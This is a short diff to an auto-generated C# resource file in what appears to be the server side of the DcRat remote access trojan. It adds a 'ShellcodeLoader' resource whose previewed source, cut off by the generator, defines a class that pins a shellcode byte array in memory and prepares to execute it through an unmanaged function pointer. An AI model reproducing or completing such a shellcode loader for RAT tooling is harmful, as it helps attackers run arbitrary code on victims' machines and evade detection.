@@ -239,6 +239,31 @@ namespace Server.Properties {
         }
         
         /// <summary>
+        ///   查找类似 using System;
+        ///using System.Runtime.InteropServices;
+        ///
+        ///namespace DcRat_Shellcode_Loader
+        ///{
+        ///    public class ShellCode
+        ///    {
+        ///        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        ///        private delegate int Run();
+        ///
+        ///        public static bool ShellCodeExecute(byte[] ShellCode)
+        ///        {
+        ///            try
+        ///            {
+        ///                GCHandle pinnedArray = GCHandle.Alloc(ShellCode, GCHandleType.Pinned);
+        ///                IntPtr ptr = pinnedArray.AddrOfPinnedObject();
+        ///                Marshal.Co [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        /// </summary>
+        public static string ShellcodeLoader {
+            get {
+                return ResourceManager.GetString("ShellcodeLoader", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   查找 System.Drawing.Bitmap 类型的本地化资源。
         /// </summary>
         public static System.Drawing.Bitmap stop__1_ {
